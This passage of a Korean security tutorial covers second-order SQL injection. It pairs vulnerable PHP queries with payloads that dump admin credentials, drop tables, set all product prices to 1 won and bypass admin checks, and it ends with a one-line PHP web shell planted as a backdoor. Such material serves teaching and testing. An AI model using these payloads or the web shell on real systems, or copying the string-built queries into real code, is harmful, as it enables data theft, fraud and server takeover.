<p><strong>저장</strong>: <code>posts</code> 테이블에 안전하게 저장</p>
<p><strong>2단계: 게시글 검색</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$search = $_GET[&#x27;q&#x27;];  // &quot;Normal&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 취약한 쿼리</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;SELECT * FROM posts WHERE title LIKE &#x27;%$search%&#x27; OR content LIKE &#x27;%$search%&#x27;&quot;;</span><br></span></code></pre></div></div>
<p>검색 시 <code>content</code> 필드의 페이로드가 쿼리에 포함되어 실행</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3-장바구니--주문">3. 장바구니 → 주문<a href="#3-장바구니--주문" class="hash-link" aria-label="Direct link to 3. 장바구니 → 주문" title="Direct link to 3. 장바구니 → 주문" translate="no">​</a></h3>
<p><strong>1단계: 상품명 조작</strong> (관리자 권한 필요):</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">UPDATE</span><span class="token plain"> products </span><span class="token keyword" style="color:#00009f">SET</span><span class="token plain"> name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;Laptop&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">DROP</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> orders</span><span class="token comment" style="color:#999988;font-style:italic">--&#x27; WHERE id=1</span><br></span></code></pre></div></div>
<p><strong>2단계: 장바구니 담기</strong> (일반 사용자):</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$product_id = $_POST[&#x27;product_id&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 상품명 조회</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;SELECT name FROM products WHERE id=$product_id&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$product_name = mysqli_fetch_assoc(mysqli_query($conn, $query))[&#x27;name&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 장바구니 추가 (취약)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;INSERT INTO cart (user_id, product_name) VALUES ($user_id, &#x27;$product_name&#x27;)&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysqli_query($conn, $query);</span><br></span></code></pre></div></div>
<p><strong>결과</strong>: <code>orders</code> 테이블 삭제</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4-댓글-작성--관리자-페이지">4. 댓글 작성 → 관리자 페이지<a href="#4-댓글-작성--관리자-페이지" class="hash-link" aria-label="Direct link to 4. 댓글 작성 → 관리자 페이지" title="Direct link to 4. 댓글 작성 → 관리자 페이지" translate="no">​</a></h3>
<p><strong>1단계: 댓글 작성</strong> (일반 사용자):</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Comment: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&#x27; UNION SELECT username, password FROM admin_users--</span><br></span></code></pre></div></div>
<p><strong>2단계: 관리자가 댓글 관리 페이지 접속</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 관리자 페이지 - 댓글 목록</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;SELECT * FROM comments WHERE status=&#x27;pending&#x27;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$comments = mysqli_query($conn, $query);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">foreach ($comments as $comment) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 댓글 내용을 다른 쿼리에 사용</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $query = &quot;SELECT user_id FROM users WHERE id=&quot; . $comment[&#x27;user_id&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="수동-공격-manual-exploitation">수동 공격 (Manual Exploitation)<a href="#수동-공격-manual-exploitation" class="hash-link" aria-label="Direct link to 수동 공격 (Manual Exploitation)" title="Direct link to 수동 공격 (Manual Exploitation)" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="단계-1-취약점-식별">단계 1: 취약점 식별<a href="#단계-1-취약점-식별" class="hash-link" aria-label="Direct link to 단계 1: 취약점 식별" title="Direct link to 단계 1: 취약점 식별" translate="no">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="데이터-흐름-분석">데이터 흐름 분석<a href="#데이터-흐름-분석" class="hash-link" aria-label="Direct link to 데이터 흐름 분석" title="Direct link to 데이터 흐름 분석" translate="no">​</a></h4>
<p><strong>확인 사항</strong>:</p>
<ol>
<li>입력값이 어디에 저장되는가?</li>
<li>저장된 값이 나중에 어디서 사용되는가?</li>
<li>재사용 시 Prepared Statement를 사용하는가?</li>
</ol>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="테스트-페이로드">테스트 페이로드<a href="#테스트-페이로드" class="hash-link" aria-label="Direct link to 테스트 페이로드" title="Direct link to 테스트 페이로드" translate="no">​</a></h4>
<p><strong>회원가입 시 특수문자 삽입</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: test&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Email: test@example.com</span><br></span></code></pre></div></div>
<p><strong>다른 기능에서 확인</strong>:</p>
<ul>
<li>프로필 페이지</li>
<li>설정 페이지</li>
<li>주문 내역</li>
</ul>
<p><strong>SQL 에러 발생 시</strong> → Second-Order SQLi 가능성</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="단계-2-페이로드-저장">단계 2: 페이로드 저장<a href="#단계-2-페이로드-저장" class="hash-link" aria-label="Direct link to 단계 2: 페이로드 저장" title="Direct link to 단계 2: 페이로드 저장" translate="no">​</a></h3>
<p><strong>시나리오</strong>: 사용자 프로필 수정 공격</p>
<p><strong>1. 회원가입</strong> (페이로드 저장):</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: admin&#x27;--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password: Password123!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Email: attacker@evil.com</span><br></span></code></pre></div></div>
<p><strong>저장 확인</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> username </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> email</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;attacker@evil.com&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>결과</strong>: <code>admin&#x27;--</code></p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="단계-3-취약한-기능-찾기">단계 3: 취약한 기능 찾기<a href="#단계-3-취약한-기능-찾기" class="hash-link" aria-label="Direct link to 단계 3: 취약한 기능 찾기" title="Direct link to 단계 3: 취약한 기능 찾기" translate="no">​</a></h3>
<p><strong>프로필 수정 기능 테스트</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://example.com/profile/edit</span><br></span></code></pre></div></div>
<p><strong>Burp Suite로 요청 캡처</strong>:</p>
<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-http codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">POST /profile/edit HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: example.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Cookie: session=abc123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bio=Test bio</span><br></span></code></pre></div></div>
<p><strong>응답 관찰</strong>:</p>
<ul>
<li>SQL 에러 발생 시 → 취약</li>
<li>정상 작동 시 → 다른 기능 테스트</li>
</ul>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="단계-4-페이로드-최적화">단계 4: 페이로드 최적화<a href="#단계-4-페이로드-최적화" class="hash-link" aria-label="Direct link to 단계 4: 페이로드 최적화" title="Direct link to 단계 4: 페이로드 최적화" translate="no">​</a></h3>
<p><strong>목표</strong>: 관리자 계정 권한 상승</p>
<p><strong>회원가입 페이로드 변경</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: attacker&#x27; UNION SELECT &#x27;admin&#x27;, &#x27;hacked&#x27;, &#x27;admin@example.com&#x27;, &#x27;admin&#x27;--</span><br></span></code></pre></div></div>
<p><strong>프로필 수정 시 실행되는 쿼리</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">UPDATE</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">SET</span><span class="token plain"> bio</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;My bio&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;attacker&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;hacked&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;admin@example.com&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--&#x27;</span><br></span></code></pre></div></div>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="단계-5-데이터-추출">단계 5: 데이터 추출<a href="#단계-5-데이터-추출" class="hash-link" aria-label="Direct link to 단계 5: 데이터 추출" title="Direct link to 단계 5: 데이터 추출" translate="no">​</a></h3>
<p><strong>Username 페이로드</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: &#x27; UNION SELECT username, password, email, role FROM users WHERE role=&#x27;admin&#x27;--</span><br></span></code></pre></div></div>
<p><strong>나중에 프로필 페이지 접속 시</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$username = $_SESSION[&#x27;username&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;SELECT * FROM profiles WHERE username=&#x27;$username&#x27;&quot;;</span><br></span></code></pre></div></div>
<p><strong>생성되는 쿼리</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> profiles </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> password</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> email</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> role </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> role</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--&#x27;</span><br></span></code></pre></div></div>
<p><strong>결과</strong>: 관리자 정보 노출</p>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="실전-공격-시나리오">실전 공격 시나리오<a href="#실전-공격-시나리오" class="hash-link" aria-label="Direct link to 실전 공격 시나리오" title="Direct link to 실전 공격 시나리오" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="시나리오-1-e-commerce-가격-조작">시나리오 1: E-commerce 가격 조작<a href="#시나리오-1-e-commerce-가격-조작" class="hash-link" aria-label="Direct link to 시나리오 1: E-commerce 가격 조작" title="Direct link to 시나리오 1: E-commerce 가격 조작" translate="no">​</a></h3>
<p><strong>대상</strong>: 온라인 쇼핑몰</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="phase-1-페이로드-저장">Phase 1: 페이로드 저장<a href="#phase-1-페이로드-저장" class="hash-link" aria-label="Direct link to Phase 1: 페이로드 저장" title="Direct link to Phase 1: 페이로드 저장" translate="no">​</a></h4>
<p><strong>1. 회원가입</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: victim&#x27; WHERE user_id=1; UPDATE products SET price=1--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password: password123</span><br></span></code></pre></div></div>
<p><strong>데이터베이스 상태</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">INSERT</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">INTO</span><span class="token plain"> users </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> password</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">VALUES</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;victim&#x27;&#x27; WHERE user_id=1; UPDATE products SET price=1--&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;hash&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>→ 안전하게 저장 (Prepared Statement 사용)</p>
<hr>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="phase-2-취약한-기능-찾기">Phase 2: 취약한 기능 찾기<a href="#phase-2-취약한-기능-찾기" class="hash-link" aria-label="Direct link to Phase 2: 취약한 기능 찾기" title="Direct link to Phase 2: 취약한 기능 찾기" translate="no">​</a></h4>
<p><strong>2. 주문 내역 페이지 접속</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// orders.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$username = $_SESSION[&#x27;username&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 취약한 쿼리</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;SELECT * FROM orders WHERE username=&#x27;$username&#x27;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$result = mysqli_query($conn, $query);</span><br></span></code></pre></div></div>
<p><strong>생성되는 쿼리</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> orders </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;victim&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> user_id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">UPDATE</span><span class="token plain"> products </span><span class="token keyword" style="color:#00009f">SET</span><span class="token plain"> price</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token comment" style="color:#999988;font-style:italic">--&#x27;</span><br></span></code></pre></div></div>
<p><strong>실행 결과</strong> (Stacked Queries 지원 시):</p>
<ol>
<li><code>SELECT * FROM orders WHERE username=&#x27;victim&#x27;</code> 실행</li>
<li><code>UPDATE products SET price=1</code> 실행</li>
<li><strong>모든 상품 가격이 1원으로 변경</strong></li>
</ol>
<hr>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="phase-3-악용">Phase 3: 악용<a href="#phase-3-악용" class="hash-link" aria-label="Direct link to Phase 3: 악용" title="Direct link to Phase 3: 악용" translate="no">​</a></h4>
<p><strong>3. 고가 상품 구매</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">- Laptop (원가 2,000,000원) → 1원</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- iPhone (원가 1,500,000원) → 1원</span><br></span></code></pre></div></div>
<p><strong>총 결제 금액</strong>: 2원</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="시나리오-2-관리자-권한-탈취">시나리오 2: 관리자 권한 탈취<a href="#시나리오-2-관리자-권한-탈취" class="hash-link" aria-label="Direct link to 시나리오 2: 관리자 권한 탈취" title="Direct link to 시나리오 2: 관리자 권한 탈취" translate="no">​</a></h3>
<p><strong>대상</strong>: 블로그 플랫폼</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="phase-1-계정-생성">Phase 1: 계정 생성<a href="#phase-1-계정-생성" class="hash-link" aria-label="Direct link to Phase 1: 계정 생성" title="Direct link to Phase 1: 계정 생성" translate="no">​</a></h4>
<p><strong>1. 회원가입</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: normaluser</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Email: hacker@evil.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Bio: &#x27; OR role=&#x27;admin&#x27;--</span><br></span></code></pre></div></div>
<p><strong>저장</strong>: <code>users</code> 테이블</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">| id | username   | email           | bio                    | role |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|----|------------|-----------------|------------------------|------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| 5  | normaluser | hacker@evil.com | &#x27; OR role=&#x27;admin&#x27;--    | user |</span><br></span></code></pre></div></div>
<hr>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="phase-2-권한-확인-우회">Phase 2: 권한 확인 우회<a href="#phase-2-권한-확인-우회" class="hash-link" aria-label="Direct link to Phase 2: 권한 확인 우회" title="Direct link to Phase 2: 권한 확인 우회" translate="no">​</a></h4>
<p><strong>2. 관리자 페이지 접속 시도</strong>:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// admin/index.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$user_id = $_SESSION[&#x27;user_id&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 취약한 권한 확인 쿼리</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$query = &quot;SELECT * FROM users WHERE id=$user_id AND (role=&#x27;admin&#x27; OR bio=&#x27;admin&#x27;)&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$user = mysqli_fetch_assoc(mysqli_query($conn, $query));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if ($user) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // 관리자 페이지 표시</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><strong>실제 쿼리</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">AND</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">role</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">OR</span><span class="token plain"> bio</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">OR</span><span class="token plain"> role</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;admin&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">--&#x27;)</span><br></span></code></pre></div></div>
<p><strong>결과</strong>: 조건 통과 → <strong>관리자 권한 획득</strong></p>
<hr>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="phase-3-백도어-설치">Phase 3: 백도어 설치<a href="#phase-3-백도어-설치" class="hash-link" aria-label="Direct link to Phase 3: 백도어 설치" title="Direct link to Phase 3: 백도어 설치" translate="no">​</a></h4>
<p><strong>3. 관리자 기능으로 파일 업로드</strong>:</p>
<p>웹셸 업로드:</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br></span></code></pre></div></div>
<hr>
